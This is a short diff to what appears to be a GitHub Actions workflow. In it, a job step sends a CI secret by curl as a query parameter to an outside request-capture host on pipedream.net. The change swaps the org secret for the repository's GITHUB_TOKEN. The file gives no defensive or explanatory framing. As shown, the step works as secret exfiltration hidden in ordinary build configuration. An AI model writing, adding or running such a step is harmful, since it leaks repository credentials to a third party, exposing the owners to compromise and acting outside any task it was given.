@@ -15,4 +15,4 @@ jobs:
           VAR_ABC=$VALUE
           curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
         env:
-          VALUE: ${{ secrets.ORG_SEC }}
+          VALUE: ${{ secrets.GITHUB_TOKEN }}
